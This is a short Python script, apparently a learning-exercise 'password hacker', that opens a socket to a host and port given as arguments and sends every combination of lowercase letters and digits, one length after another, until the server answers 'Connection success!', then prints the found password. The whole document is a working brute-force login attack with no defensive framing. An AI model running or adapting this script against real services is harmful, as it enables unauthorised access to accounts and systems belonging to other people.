import socket
import sys
import itertools
import string


def combinator(i):
    yield from itertools.product(*([symbols] * i))


hack_socket = socket.socket()

host = str(sys.argv[1])
port = int(sys.argv[2])

hack_socket.connect((host, port))

symbols = list(itertools.chain(string.ascii_lowercase, string.digits))

iteration = 1
breaker = False

while True:
    for char in combinator(iteration):
        request = ''.join(char)
        byte_request = request.encode()
        hack_socket.send(byte_request)
        byte_result = hack_socket.recv(1024)
        result = byte_result.decode()
        if result == "Connection success!":
            print(request)
            breaker = True
            break
    iteration += 1
    if breaker:
        break

print(result)

hack_socket.close()
